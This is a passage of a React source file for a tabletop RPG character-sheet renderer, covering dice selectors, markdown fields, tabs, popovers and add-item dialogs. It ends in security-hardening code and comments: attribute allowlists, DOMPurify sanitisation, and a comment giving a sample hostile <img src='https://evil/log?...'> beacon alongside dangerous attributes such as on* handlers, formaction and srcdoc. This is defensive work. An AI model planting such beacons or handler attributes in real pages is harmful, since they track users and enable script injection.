import React, { useEffect, useLayoutEffect, useState, useRef, useContext, createContext } from 'react';
import { createPortal } from 'react-dom';
import DOMPurify from 'dompurify';
import { api } from '../api';

const DIE_VALUES = ['d4', 'd6', 'd8', 'd10', 'd12'];

// Whether clickable links to OTHER origins are allowed in sheet content.
// Default: blocked (external <a> rendered as plain text). The SheetRenderer
// component mirrors the stored app setting onto this variable each render, so
// renderNodeFull (a module-level helper) reads the current policy without
// threading it through the whole recursion.
let allowExternalLinks = false;

// Mirrors the readOnly prop the same way (share views) so item-level widgets
// like the info popover can respect it without threading it through every call.
let sheetReadOnly = false;
let sheetExportMode = false;

// True if href points to a different origin than the app itself.
// Relative / same-origin links are never treated as external.
function isExternalHref(href) {
  if (!href) return false;
  try {
    return new URL(href, window.location.origin).origin !== window.location.origin;
  } catch {
    return false;
  }
}

function resolvePath(obj, path) {
  return path.split('.').reduce((cur, key) => (cur != null ? cur[key] : undefined), obj);
}

function setPath(obj, path, value) {
  const keys = path.split('.');
  if (keys.length === 1) return { ...obj, [keys[0]]: value };
  return {
    ...obj,
    [keys[0]]: setPath(obj[keys[0]] ?? {}, keys.slice(1).join('.'), value),
  };
}

// ── Looks up the empty item template from schema.json ─────────────────────────
// Convention: array path "skills" → schema key "emptySkill"
//             array path "hindrances" → schema key "emptyHindrance"
// Falls back to {} if not found — renderer stays functional, item just has no fields
function getEmptyItem(arrayPath, schema) {
  if (!schema) return {};
  // Strip trailing 's', capitalize, prefix with 'empty'
  // handles: skills→emptySkill, weapons→emptyWeapon, powers→emptyPower,
  //          hindrances→emptyHindrance, edges→emptyEdge, advances→emptyAdvance,
  //          abilities→emptyAbility, gear→emptyGearLine (special case)
  const singular = arrayPath.replace(/ances$/, 'ance')  // hindrances→hindrance, advances→advance
                             .replace(/edges$/, 'edge')   // edges→edge
                             .replace(/ies$/, 'y')         // abilities→ability, entries→entry
                             .replace(/s$/, '');           // skills→skill, weapons→weapon, etc.
  const key = `empty${singular.charAt(0).toUpperCase()}${singular.slice(1)}`;
  if (!schema[key]) return {};
  // Resolve dynamic tokens: a template value of "@today" becomes today's date
  // (YYYY-MM-DD, matches <input type="date">). Lets bundles pre-stamp new
  // entries — e.g. emptySession: { "date": "@today", ... }
  const item = {};
  for (const [k, v] of Object.entries(schema[key])) {
    item[k] = v === '@today' ? new Date().toISOString().slice(0, 10) : v;
  }
  return item;
}

function DieSelector({ value, onChange }) {
  const dieVal = typeof value === 'object' ? value?.die : (value ?? 'd4');
  const bonus  = typeof value === 'object' ? (value?.bonus ?? 0) : 0;

  return (
    <div className="die-selector">
      {DIE_VALUES.map((d) => (
        <button
          key={d}
          className={`die-btn${dieVal === d ? ' selected' : ''}`}
          onClick={() => onChange({ die: d, bonus: d === 'd12' ? bonus : 0 })}
          title={d}
          type="button"
        >
          {d.replace('d', '')}
        </button>
      ))}
      {dieVal === 'd12' && (
        <input
          className="die-bonus"
          type="number"
          min={0}
          max={99}
          value={bonus}
          onChange={(e) => onChange({ die: 'd12', bonus: Math.max(0, Math.min(99, parseInt(e.target.value) || 0)) })}
          title="d12 bonus"
        />
      )}
    </div>
  );
}

function Tracker({ value, max, onChange }) {
  const n = parseInt(max) || 3;
  const v = parseInt(value) || 0;
  return (
    <div className="tracker">
      {Array.from({ length: n }, (_, idx) => {
        const i = idx + 1;
        return (
          <div
            key={i}
            className={`tracker-bubble${v >= i ? ' filled' : ''}`}
            onClick={() => onChange(v === i ? i - 1 : i)}
            role="button"
            tabIndex={0}
            onKeyDown={(e) => e.key === 'Enter' && onChange(v === i ? i - 1 : i)}
          />
        );
      })}
    </div>
  );
}

function Toggle({ value, onChange }) {
  return (
    <div
      className={`conviction-bubble${value ? ' filled' : ''}`}
      onClick={() => onChange(!value)}
      role="button"
      tabIndex={0}
      onKeyDown={(e) => e.key === 'Enter' && onChange(!value)}
    />
  );
}

// Controlled <input> that scales its font down until the value fits its box,
// then back up as the value shrinks. Used for the fixed-size combat boxes
// (AC trio, HP, Speed, Passive, …) so an over-long entry such as a Speed of
// "30ft/45ft" never clips or overflows. Re-fits on value change and on box
// resize (responsive / container-query reflow). data-max-font / data-min-font
// tune the bounds; defaults 18 / 10.
function AutofitInput({ maxFont = 18, minFont = 10, ...rest }) {
  const ref = useRef(null);
  const fit = () => {
    const el = ref.current;
    if (!el || !el.clientWidth) return;
    el.style.fontSize = `${maxFont}px`;
    let fs = maxFont;
    while (fs > minFont && el.scrollWidth > el.clientWidth + 1) {
      fs -= 1;
      el.style.fontSize = `${fs}px`;
    }
  };
  // Runs after every render, so it re-fits whenever the bound value changes.
  useLayoutEffect(fit);
  // Re-fit when the box itself changes width (layout / container queries).
  useEffect(() => {
    const el = ref.current;
    if (!el || typeof ResizeObserver === 'undefined') return undefined;
    const ro = new ResizeObserver(fit);
    ro.observe(el);
    return () => ro.disconnect();
  }, []);
  return React.createElement('input', { ...rest, ref });
}

// ── Markdown field with edit/preview toggle (data-type="markdown") ───────────
// Bundles set data-type="markdown" on a <textarea data-bind="...">. Display
// renders the formatted markdown read-only via renderMarkdown (the same XSS-
// safe React-element pass used by export / info popovers — no HTML strings,
// no link rendering). A small "Edit" button flips the same box into a raw
// textarea; "Done" returns to the formatted view. The raw text is what gets
// persisted; the preview is purely a display layer.
//
// Sharing one toggle across multiple fields: wrap them in a `data-md-group`
// element and drop a `data-md-toggle` button inside. Fields inside the group
// pick up its shared editing state via context (and suppress their own
// per-field button). Fields outside any group still work standalone — fully
// backwards-compatible.
const MarkdownGroupContext = createContext(null);

function MarkdownGroup({ children, className, ...rest }) {
  const [editing, setEditing] = useState(false);
  return React.createElement(
    MarkdownGroupContext.Provider,
    { value: { editing, setEditing } },
    React.createElement('div', { className, ...rest }, children)
  );
}

function MarkdownGroupToggle({ className, ...rest }) {
  const ctx = useContext(MarkdownGroupContext);
  // Outside a group the toggle is meaningless; render nothing rather than a
  // dead button so a misplaced data-md-toggle doesn't pollute the UI.
  if (!ctx) return null;
  return React.createElement('button', {
    type: 'button',
    className: `cf-md-toggle ${className || ''}`.trim(),
    onClick: () => ctx.setEditing(!ctx.editing),
    ...rest,
  }, ctx.editing ? 'Done' : 'Edit');
}

function MarkdownField({ value, onChange, disabled, placeholder, className, rows, ...rest }) {
  const group = useContext(MarkdownGroupContext);
  const [localEditing, setLocalEditing] = useState(false);
  // When the field is inside a group, the group owns editing state and
  // renders the shared toggle button. Standalone fields manage their own.
  const editing = group ? group.editing : localEditing;
  const showOwnToggle = !group;
  const text = String(value ?? '');
  const blank = !text.trim();

  if (editing && !disabled) {
    return React.createElement('div', { className: `cf-md-field cf-md-edit ${className || ''}`.trim() },
      React.createElement('textarea', {
        ...rest,
        value: text,
        onChange,
        placeholder,
        rows: rows || 6,
        autoFocus: !group,   // grouped fields don't fight over focus
        className: 'cf-md-textarea',
      }),
      showOwnToggle ? React.createElement('button', {
        type: 'button',
        className: 'cf-md-toggle',
        onClick: () => setLocalEditing(false),
      }, 'Done') : null
    );
  }

  return React.createElement('div', { className: `cf-md-field cf-md-view ${className || ''}`.trim() },
    React.createElement('div', { className: 'cf-md-preview' },
      blank
        ? React.createElement('span', { className: 'cf-md-empty' }, placeholder || '')
        : renderMarkdown(text)
    ),
    (disabled || !showOwnToggle) ? null : React.createElement('button', {
      type: 'button',
      className: 'cf-md-toggle',
      onClick: () => setLocalEditing(true),
    }, 'Edit')
  );
}

// ── Stepper widget (data-type="stepper") ────────────────────────────────────
// Stacked ▲/▼ control bound to a numeric field. Commonly paired with a
// readonly number display (or another input bound to the same field) so the
// player can nudge a "current" value up/down without typing. Respects min/max
// from data-min / data-max when supplied.
function Stepper({ value, onChange, min, max, disabled }) {
  const n = Number(value) || 0;
  const canUp   = max === undefined || n < max;
  const canDown = min === undefined || n > min;
  const bump = (d) => { if (!disabled) onChange(Math.max(min ?? -Infinity, Math.min(max ?? Infinity, n + d))); };
  return React.createElement('div', { className: 'cf-stepper' },
    React.createElement('button', {
      type: 'button',
      className: 'cf-stepper-btn cf-stepper-up',
      onClick: () => bump(+1),
      disabled: disabled || !canUp,
      'aria-label': 'Increase',
    }, '▲'),
    React.createElement('button', {
      type: 'button',
      className: 'cf-stepper-btn cf-stepper-down',
      onClick: () => bump(-1),
      disabled: disabled || !canDown,
      'aria-label': 'Decrease',
    }, '▼')
  );
}



const XP_MILESTONES = new Set([5, 10, 15, 20, 25, 30]);

// Collapsible section. Opt-in: an author puts data-collapsible="Title" on an
// element (and optionally data-collapsed to start closed). The renderer hands
// the element's children here as the body; this component owns the open state,
// so it persists across the renderer's re-walks. Author classes are preserved.
function Collapsible({ title, defaultOpen = true, className, children, exportMode = false, ...rest }) {
  const [open, setOpen] = useState(defaultOpen);
  const isOpen = exportMode ? true : open;            // export renders fully open
  const cls = ['cf-collapsible', className].filter(Boolean).join(' ');
  return React.createElement('div', { ...rest, className: cls, 'data-open': isOpen ? 'true' : 'false' },
    React.createElement('button', {
      type: 'button',
      className: 'cf-collapsible-header',
      'aria-expanded': isOpen ? 'true' : 'false',
      onClick: () => setOpen((o) => !o),
      disabled: exportMode,
    },
      React.createElement('span', { className: 'cf-collapsible-title' }, title),
      exportMode ? null : React.createElement('span', { className: 'cf-collapsible-caret' }, '▾'),
    ),
    isOpen && React.createElement('div', { className: 'cf-collapsible-body' }, ...children),
  );
}

// ── Tabs ──────────────────────────────────────────────────────────────────────
// Opt-in: a container with data-tabs whose element children carry
// data-tab="Label". The renderer collects the labels, renders a tab bar, and
// shows one panel at a time. All panels stay mounted (display:none when
// inactive) so collapsible/open state inside them survives tab switches.
function Tabs({ labels, panels, panelClasses = [], className, exportMode = false, skipExport = [], ...rest }) {
  const [active, setActive] = useState(0);
  const cls = ['cf-tabs', className].filter(Boolean).join(' ');

  // Export: no interactive bar — every panel shown, stacked, each under its tab
  // label, so one capture gets the whole character. Each panel is tagged
  // .cf-tab-export so the capture loop can also grab them one at a time (PDF).
  if (exportMode) {
    return React.createElement('div', { ...rest, className: cls + ' cf-tabs-export' },
      panels.map((kids, i) => skipExport[i] ? null : React.createElement('div', {
        key: `p${i}`,
        role: 'tabpanel',
        className: ['cf-tab-panel', 'cf-tab-export', panelClasses[i]].filter(Boolean).join(' '),
      },
        React.createElement('h2', { className: 'cf-export-tab-title' }, labels[i]),
        ...kids,
      ))
    );
  }

  return React.createElement('div', { ...rest, className: cls },
    React.createElement('div', { className: 'cf-tab-bar', role: 'tablist' },
      labels.map((label, i) => React.createElement('button', {
        key: i,
        type: 'button',
        role: 'tab',
        'aria-selected': i === active ? 'true' : 'false',
        className: `cf-tab-btn${i === active ? ' active' : ''}`,
        onClick: () => setActive(i),
      }, label))
    ),
    panels.map((kids, i) => React.createElement('div', {
      key: `p${i}`,
      role: 'tabpanel',
      className: ['cf-tab-panel', panelClasses[i]].filter(Boolean).join(' '),
      style: i === active ? undefined : { display: 'none' },
    }, ...kids))
  );
}

// ── Minimal markdown → React elements ────────────────────────────────────────
// Read-only formatting for description display (info popover + export). Supports
// the "basic" set only: **bold** / __bold__, *italic* / _italic_, bullet lists
// (-, *, +), numbered lists (1.), and line breaks (single newline → <br>, blank
// line → new paragraph). The editable textarea still holds the raw markdown the
// player typed — this only affects how it's DISPLAYED.
//
// It emits React elements, never an HTML string, so there is no
// dangerouslySetInnerHTML and therefore no XSS surface: anything it doesn't
// recognize falls through as plain text. No new dependencies.

// Inline pass: one line of text → array of strings + <strong>/<em> spans.
// Bold is matched before italic so `**x**` isn't chewed up by the single-* rule.
function renderInlineMd(text, keyPrefix) {
  const out = [];
  let rest = String(text);
  let k = 0;
  const re = /(\*\*|__)(.+?)\1|(\*|_)(.+?)\3/;   // bold first, then italic
  while (rest) {
    const m = re.exec(rest);
    if (!m) { out.push(rest); break; }
    if (m.index > 0) out.push(rest.slice(0, m.index));
    if (m[2] !== undefined) out.push(React.createElement('strong', { key: `${keyPrefix}-b${k++}` }, m[2]));
    else                    out.push(React.createElement('em',     { key: `${keyPrefix}-i${k++}` }, m[4]));
    rest = rest.slice(m.index + m[0].length);
  }
  return out;
}

// Block pass: group consecutive list lines into <ul>/<ol>, runs of plain lines
// into <p> (joined by <br>), blank lines separate paragraphs. Returns an array
// of block elements, or null when the source is empty.
function renderMarkdown(src) {
  const text = String(src ?? '');
  if (!text.trim()) return null;
  const lines = text.replace(/\r\n?/g, '\n').split('\n');

  const blocks = [];
  let para = [];        // buffered plain lines for the current paragraph
  let list = null;      // { ordered, items: [string] } while collecting a list
  let bk = 0;

  const flushPara = () => {
    if (!para.length) return;
    const kids = [];
    para.forEach((ln, i) => {
      if (i > 0) kids.push(React.createElement('br', { key: `br${bk}-${i}` }));
      kids.push(...renderInlineMd(ln, `p${bk}-${i}`));
    });
    blocks.push(React.createElement('p', { key: `blk${bk++}`, className: 'cf-md-p' }, ...kids));
    para = [];
  };
  const flushList = () => {
    if (!list) return;
    const items = list.items.map((it, i) =>
      React.createElement('li', { key: `li${bk}-${i}` }, ...renderInlineMd(it, `l${bk}-${i}`)));
    blocks.push(React.createElement(list.ordered ? 'ol' : 'ul',
      { key: `blk${bk++}`, className: 'cf-md-list' }, ...items));
    list = null;
  };

  for (const raw of lines) {
    const line   = raw.trimEnd();
    const bullet = /^\s*[-*+]\s+(.*)$/.exec(line);
    const number = /^\s*\d+\.\s+(.*)$/.exec(line);
    if (bullet || number) {
      flushPara();
      const ordered = !!number;
      if (!list || list.ordered !== ordered) { flushList(); list = { ordered, items: [] }; }
      list.items.push(bullet ? bullet[1] : number[1]);
    } else if (line.trim() === '') {
      flushPara(); flushList();
    } else {
      flushList();
      para.push(line);
    }
  }
  flushPara(); flushList();
  return blocks;
}

// ── Info popover (the ⓘ) ─────────────────────────────────────────────────────
// One component serves three content sources:
//   refText — read-only "Rules" text shipped in schema.json's reference map
//   text    — the player's own description field on the item (editable inline)
// Opens on hover (desktop) with a grace delay, pins on click/tap (mobile).
// Portaled to document.body: .sheet-root uses container-type, whose layout
// containment would otherwise capture position:fixed and break placement.
function InfoButton({ title, refText, text, editable, onChange }) {
  const [open,   setOpen]   = useState(false);
  const [pinned, setPinned] = useState(false);
  const [editing, setEditing] = useState(false);
  const [pos,    setPos]    = useState(null);
  const btnRef  = useRef(null);
  const popRef  = useRef(null);
  const closeT  = useRef(null);

  const hasContent = !!(refText || (text && String(text).trim()));

  // Outside click / Escape closes
  useEffect(() => {
    if (!open) return;
    const onDown = (e) => {
      if (popRef.current?.contains(e.target)) return;
      if (btnRef.current?.contains(e.target)) return;
      setOpen(false); setPinned(false);
    };
    const onKey = (e) => { if (e.key === 'Escape') { setOpen(false); setPinned(false); } };
    document.addEventListener('mousedown', onDown);
    document.addEventListener('keydown', onKey);
    return () => {
      document.removeEventListener('mousedown', onDown);
      document.removeEventListener('keydown', onKey);
    };
  }, [open]);

  // Nothing to show and no way to add it → render nothing (read-only views)
  if (!editable && !hasContent) return null;

  const openPop = () => {
    clearTimeout(closeT.current);
    setEditing(!(text && String(text).trim()));
    const r = btnRef.current?.getBoundingClientRect();
    if (!r) return;
    const width = Math.min(320, window.innerWidth - 16);
    const left  = Math.max(8, Math.min(r.left + r.width / 2 - width / 2, window.innerWidth - width - 8));
    const spaceBelow = window.innerHeight - r.bottom - 14;
    const openBelow  = spaceBelow >= 140 || spaceBelow >= r.top - 14;
    const maxH = Math.max(80, Math.min(300, openBelow ? spaceBelow : r.top - 14));
    setPos(openBelow
      ? { top: r.bottom + 6, left, width, maxH }
      : { bottom: window.innerHeight - r.top + 6, left, width, maxH });
    setOpen(true);
  };

  const enter = () => { clearTimeout(closeT.current); if (!open) openPop(); };
  const leave = () => {
    if (pinned) return;
    closeT.current = setTimeout(() => setOpen(false), 250);
  };
  const onClick = () => {
    if (open && pinned) { setOpen(false); setPinned(false); }
    else { openPop(); setPinned(true); }
  };

  return React.createElement('span', { className: 'cf-info-wrap', onMouseEnter: enter, onMouseLeave: leave },
    React.createElement('button', {
      ref: btnRef,
      type: 'button',
      className: `cf-info-btn${hasContent ? ' has-content' : ''}`,
      'aria-label': 'Details',
      onClick,
    }, 'ⓘ'),
    open && pos ? createPortal(
      React.createElement('div', {
        ref: popRef,
        className: 'cf-info-pop',
        style: { top: pos.top, bottom: pos.bottom, left: pos.left, width: pos.width, maxHeight: pos.maxH },
        onMouseEnter: () => clearTimeout(closeT.current),
        onMouseLeave: leave,
      },
        title ? React.createElement('div', { className: 'cf-info-title' }, title) : null,
        refText ? React.createElement('div', { className: 'cf-info-ref' },
          React.createElement('div', { className: 'cf-info-ref-label' }, 'Rules'),
          refText,
        ) : null,
        editable
          ? (() => {
              const hasText = !!(text && String(text).trim());
              const showEdit = editing || !hasText;     // blank field → straight to typing
              return React.createElement(React.Fragment, null,
                // Mode bar: only meaningful once there's text worth previewing.
                hasText ? React.createElement('div', { className: 'cf-info-modebar' },
                  React.createElement('button', {
                    type: 'button',
                    className: `cf-info-mode${!showEdit ? ' active' : ''}`,
                    onClick: () => setEditing(false),
                  }, 'Preview'),
                  React.createElement('button', {
                    type: 'button',
                    className: `cf-info-mode${showEdit ? ' active' : ''}`,
                    onClick: () => { setEditing(true); setPinned(true); },
                  }, 'Edit'),
                ) : null,
                showEdit
                  ? React.createElement('textarea', {
                      className: 'cf-info-edit',
                      rows: 4,
                      placeholder: 'Add details…  **bold**  *italic*  - list',
                      value: text || '',
                      onChange: (e) => onChange && onChange(e.target.value),
                      onFocus: () => setPinned(true),
                      autoFocus: editing,
                    })
                  // Click the preview to jump back into editing.
                  : React.createElement('div', {
                      className: 'cf-info-text cf-info-text-edit',
                      title: 'Click to edit',
                      onClick: () => { setEditing(true); setPinned(true); },
                    }, renderMarkdown(text)),
              );
            })()
          : (text && String(text).trim()
              ? React.createElement('div', { className: 'cf-info-text' }, renderMarkdown(text))
              : null),
      ),
      document.body,
    ) : null,
  );
}

// ── Add-item dialog ───────────────────────────────────────────────────────────
// Driven by schema.json: addForms.<listName> is an array of field definitions
// ({ bind, label, type, options?, required? }). Confirm merges the entered
// values over the list's empty-item template and appends (or prepends).
function AddDialog({ title, fields, base, onConfirm, onCancel }) {
  const [vals, setVals] = useState(() => ({ ...base }));
  const set = (k, v) => setVals((s) => ({ ...s, [k]: v }));
  const canAdd = fields
    .filter((f) => f.required)
    .every((f) => String(vals[f.bind] ?? '').trim() !== '');

  const renderField = (f) => {
    const v = vals[f.bind];
    if (f.type === 'textarea') return React.createElement('textarea', { rows: 3, value: v || '', onChange: (e) => set(f.bind, e.target.value) });
    if (f.type === 'select')   return React.createElement('select', { value: v ?? (f.options?.[0] || ''), onChange: (e) => set(f.bind, e.target.value) },
      (f.options || []).map((o) => React.createElement('option', { key: o, value: o }, o)));
    if (f.type === 'die')      return React.createElement(DieSelector, { value: v ?? { die: 'd4', bonus: 0 }, onChange: (val) => set(f.bind, val) });
    if (f.type === 'number')   return React.createElement('input', { type: 'number', value: v ?? '', onChange: (e) => set(f.bind, parseFloat(e.target.value) || 0) });
    return React.createElement('input', { type: 'text', value: v || '', onChange: (e) => set(f.bind, e.target.value), autoFocus: f === fields[0] });
  };

  return createPortal(
    React.createElement('div', { className: 'cf-dialog-overlay', onMouseDown: onCancel },
      React.createElement('div', { className: 'cf-dialog', onMouseDown: (e) => e.stopPropagation() },
        React.createElement('div', { className: 'cf-dialog-title' }, title),
        fields.map((f) => React.createElement('div', { key: f.bind, className: 'cf-dialog-field' },
          React.createElement('label', null, f.label),
          renderField(f),
        )),
        React.createElement('div', { className: 'cf-dialog-actions' },
          React.createElement('button', { type: 'button', className: 'cf-dialog-cancel', onClick: onCancel }, 'Cancel'),
          React.createElement('button', { type: 'button', className: 'cf-dialog-confirm', disabled: !canAdd, onClick: () => onConfirm(vals) }, 'Add'),
        ),
      ),
    ),
    document.body,
  );
}

// data-action="add" host. If the schema defines addForms.<target>, the button
// opens the dialog; otherwise it appends an empty item directly (the existing
// behavior — swade-core and risus-core keep working unchanged).
// data-insert="prepend" puts new items at the top (e.g. newest session first).
function AddItemButton({ label, target, prepend, formTitle, char, updateRef, schemaRef, hostProps }) {
  const [show, setShow] = useState(false);
  const schema = schemaRef.current;
  const form = schema?.addForms?.[target];

  const doAdd = (item) => {
    const current = resolvePath(char, target) ?? [];
    updateRef.current(setPath(char, target, prepend ? [item, ...current] : [...current, item]));
  };

  const onClick = () => {
    if (form && form.length) setShow(true);
    else doAdd(getEmptyItem(target, schema));
  };

  return React.createElement(React.Fragment, null,
    React.createElement('button', { ...hostProps, onClick, type: 'button' }, label),
    show ? React.createElement(AddDialog, {
      title: formTitle || label.replace(/^\+\s*/, ''),
      fields: form,
      base: getEmptyItem(target, schema),
      onCancel: () => setShow(false),
      onConfirm: (vals) => { doAdd({ ...getEmptyItem(target, schema), ...vals }); setShow(false); },
    }) : null,
  );
}

function XPTracker({ value, max, onChange }) {
  const n = parseInt(max) || 30;
  const v = parseInt(value) || 0;
  const elements = [];
  for (let i = 1; i <= n; i++) {
    elements.push(
      <div
        key={i}
        className={`xp-bubble${v >= i ? ' filled' : ''}`}
        onClick={() => onChange(v === i ? i - 1 : i)}
        role="button"
        tabIndex={0}
        onKeyDown={(e) => e.key === 'Enter' && onChange(v === i ? i - 1 : i)}
      />
    );
    if (XP_MILESTONES.has(i)) {
      elements.push(<span key={`m${i}`} className="xp-milestone">{i}</span>);
    }
  }
  return <div className="xp-track">{elements}</div>;
}

const RANK_COLORS = { N: '#3a7a3a', S: '#2a6a8a', V: '#7a4a9a', H: '#8a3a2a', L: '#8a7a1a' };

function RankBadge({ value }) {
  return (
    <span className="rank-badge" style={{ fontFamily: 'var(--font-header, var(--font-display))', fontSize: '10px', fontWeight: 700, color: RANK_COLORS[value] || '#555', minWidth: '14px', flexShrink: 0 }}>
      {value ?? ''}
    </span>
  );
}

function Portrait({ charId, portraitUrl, onUpload, readOnly }) {
  const inputRef = useRef();

  const handleUpload = async (e) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const fd = new FormData();
    fd.append('portrait', file);
    const res = await fetch(`/api/characters/${charId}/portrait`, {
      method: 'POST',
      body: fd,
      credentials: 'include',
    });
    if (res.ok) {
      const data = await res.json();
      if (data.portrait && onUpload) onUpload(data.portrait);
    }
  };

  // Read-only mode (share view): just show the image or a neutral placeholder, no click handler
  if (readOnly) {
    return (
      <div className="portrait-area" style={{ cursor: 'default' }}>
        {portraitUrl
          ? <img src={`${portraitUrl}?t=${Date.now()}`} alt="Character portrait" />
          : <span className="portrait-placeholder">No portrait</span>
        }
      </div>
    );
  }

  return (
    <div className="portrait-area" onClick={() => inputRef.current?.click()} title="Click to upload portrait">
      {portraitUrl
        ? <img src={`${portraitUrl}?t=${Date.now()}`} alt="Character portrait" />
        : <span className="portrait-placeholder">Click to upload portrait</span>
      }
      <input ref={inputRef} type="file" accept="image/*" style={{ display: 'none' }} onChange={handleUpload} />
    </div>
  );
}

function getAttrs(node) {
  const out = {};
  for (const attr of node.attributes) out[attr.name] = attr.value;
  return out;
}

// Wrap <table> elements in a horizontal-scroll container so wide tables don't
// blow out the layout on narrow screens. Non-tables are returned untouched.
function wrapIfTable(tag, element, key) {
  if (tag !== 'table') return element;
  return React.createElement('div', { key, className: 'cf-table-scroll' }, element);
}

// Reserved namespace for the engine's own data-* attributes. Anything in this
// set is engine plumbing the bundle author can put in their HTML to wire data
// into the renderer; everything else under data-* is dropped by buildProps as
// "not the engine's, not allowlisted, treat as hostile" (see HARDENING comment
// at buildProps). Add new entries here when a new engine feature uses a data-*
// attribute — they're load-bearing.
const ENGINE_ATTRS = new Set([
  'data-bind','data-type','data-list','data-item','data-action','data-target','data-max','data-attr-source',
  'data-tabs','data-tab','data-ref','data-ref-key','data-insert','data-collapsible-bind','data-form-title','data-title',
  'data-max-font','data-min-font','data-max-bind','data-min',
  'data-md-group','data-md-toggle',
  // Engine attributes that were used by bundles but missed in the original set.
  // Pre-hardening these "worked" because buildProps passed everything through;
  // once buildProps enforces an allowlist, anything not here is dropped.
  'data-collapsible','data-collapse-after','data-export-skip',
]);

// ── Parse a CSS string into a React style object ─────────────────────────────
// e.g. "flex:1; font-size:11px" → { flex: '1', fontSize: '11px' }
function parseCssString(css) {
  const style = {};
  css.split(';').forEach((decl) => {
    const [prop, ...rest] = decl.split(':');
    if (!prop || !rest.length) return;
    const key = prop.trim().replace(/-([a-z])/g, (_, c) => c.toUpperCase());
    style[key] = rest.join(':').trim();
  });
  return style;
}

// ── Attribute allowlist ─────────────────────────────────────────────────────
// Bundle hardening #1: buildProps used to forward every attribute it didn't
// explicitly recognise, which let a hostile bundle set on*, formaction,
// srcdoc, or any other prop and have React wire it as a live event handler /
// dangerous DOM property. This set of allowlists inverts the default to
// "drop unless known-safe":
//
//  - GLOBAL_HTML_ATTRS:        safe on any element (id, class, title, aria-*…)
//  - TAG_SPECIFIC_HTML_ATTRS:  per-tag extras (href on <a>, src on <img>…)
//  - ENGINE_ATTRS (above):     the engine's reserved data-* namespace.
//
// Anything not on a list is dropped silently in production. In development,
// dropped attributes are reported as a console.warn so a bundle that uses
// something we missed will show itself the first time the sheet renders —
// instead of mysteriously breaking. Event-handler props (on*) are dropped
// unconditionally, regardless of tag, because they're the prize attacker
// outcome and never legitimate in static bundle HTML.

// Safe on every HTML element. NO style here — style is parsed by parseCssString
// before being handed to React, and the at-rule sanitization in #3 will sit on
// top of that. NO event handlers — see below.
const GLOBAL_HTML_ATTRS = new Set([
  'id','class','title','lang','dir','hidden','tabindex','role','style',
  // aria-* is whitelisted by a startsWith check in the loop (it's a family,
  // not a fixed name); listing them all individually would be brittle.
]);

// Per-tag extras. Tags not in this map get only GLOBAL_HTML_ATTRS + ENGINE_ATTRS.
const TAG_SPECIFIC_HTML_ATTRS = {
  a:        new Set(['href','target','rel','download','hreflang']),
  img:      new Set(['src','alt','width','height','loading','decoding','srcset','sizes']),
  input:    new Set(['type','name','value','placeholder','min','max','step','checked',
                     'disabled','readonly','required','maxlength','minlength','pattern',
                     'autocomplete','inputmode','list','size']),
  textarea: new Set(['name','placeholder','rows','cols','wrap','disabled','readonly',
                     'required','maxlength','minlength','autocomplete']),
  select:   new Set(['name','multiple','size','disabled','required','autocomplete']),
  option:   new Set(['value','selected','disabled','label']),
  optgroup: new Set(['label','disabled']),
  label:    new Set(['for']),
  button:   new Set(['type','disabled','name','value']),
  // Tables — colSpan/rowSpan/scope/headers cover everything bundles need.
  table:    new Set([]),
  thead:    new Set([]), tbody: new Set([]), tfoot: new Set([]),
  tr:       new Set([]),
  th:       new Set(['colspan','rowspan','scope','headers','abbr']),
  td:       new Set(['colspan','rowspan','scope','headers']),
  // Media: not currently used by any shipped bundle, but cheap to permit.
  // src on these still has to pass the off-origin check (hardening #4); the
  // allowlist alone doesn't make off-origin loads safe.
  video:    new Set(['src','poster','width','height','controls','preload','muted','loop','autoplay','playsinline']),
  audio:    new Set(['src','controls','preload','muted','loop','autoplay']),
  source:   new Set(['src','srcset','sizes','type','media']),
  track:    new Set(['src','srclang','label','kind','default']),
  // Form is deliberately empty: no action/method/enctype — bundles must not be
  // submitting to anywhere.
  form:     new Set([]),
};

// Attributes that React/the renderer renames as it forwards them to JSX.
// Keep this list aligned with the loop below.
// Attributes whose values are URLs — must be checked for off-origin before
// forwarding. Hardening #4: a hostile bundle's <img src="https://evil/log?...">
// causes the browser to fetch that URL on render, leaking the user's IP and
// timestamp without any interaction. Same for <video poster>, <source src>,
// <track src>, <audio src>, and <source srcset>.
//
// href is INTENTIONALLY EXCLUDED here. <a href> has its own policy at the
// walker layer (the dedicated <a> branch in renderNodeFull): if the link is
// off-origin and allowExternalLinks=false, the whole element is rewritten as
// <span> with href stripped; if allowExternalLinks=true, the href is kept
// deliberately so the user can click out. Filtering href here would break
// the allowExternalLinks=true path.
//
// formaction and the iframe/object "data" attribute aren't on any tag's
// allowlist (forms have no allowed attrs, iframes are stripped at the
// DOMPurify layer), but we list them for defence-in-depth: if a future
// change added them, the off-origin check would still fire.
//
// srcdoc is intentionally NOT listed — it carries inline HTML, not a URL,
// and is already absent from every per-tag allowlist (so it gets dropped at
// branch #6 below).
const URL_BEARING_ATTRS = new Set([
  'src', 'srcset', 'poster', 'data', 'formaction',
]);

const REACT_ATTR_RENAMES = {
  'class':    'className',
  'for':      'htmlFor',
  'tabindex': 'tabIndex',
  'colspan':  'colSpan',
  'rowspan':  'rowSpan',
  'readonly': 'readOnly',
  'maxlength':'maxLength',
  'minlength':'minLength',
  'autocomplete':'autoComplete',
  'inputmode':'inputMode',
  'crossorigin':'crossOrigin',
  'srclang':  'srcLang',
  'playsinline':'playsInline',
};

// Dev-only warning so an attribute used by an existing bundle that we didn't
// list (e.g. on a system we didn't audit) surfaces immediately instead of
// breaking silently. Production stays quiet.
const __isDev = typeof process !== 'undefined' && process.env && process.env.NODE_ENV !== 'production';

// ── DOMPurify: pre-walker HTML sanitization ────────────────────────────────
// Bundle hardening #2: before bundle HTML reaches DOMParser, run it through
// DOMPurify to strip dangerous structure that buildProps can't catch at the
// attribute level — <script>, <iframe>, <object>, <embed>, <link>,
// <meta>, malformed elements, namespace-confusion tricks, encoded XSS, etc.
//
// Two-wall defence: DOMPurify is wall #1 (structural — what tags can exist),
// buildProps is wall #2 (per-attribute — what makes it onto a React element).
// Each layer is configured from the same allowlist constants above, so there's
// only ever one source of truth.
//
// The ALLOWED_ATTR list here is intentionally PERMISSIVE (the union of every
// per-tag allowlist) — DOMPurify decides per-element only "is this attribute
// shaped like something we'd ever permit". Per-tag enforcement happens in
// buildProps, which sees the tag and rejects an attribute on the wrong element.
// Listing them all here keeps DOMPurify from stripping legitimate attrs before
// buildProps even runs.
//
// Notably permitted (DOMPurify defaults forbid them):
//   - data-* (via ALLOW_DATA_ATTR: true) — buildProps drops non-engine data-*
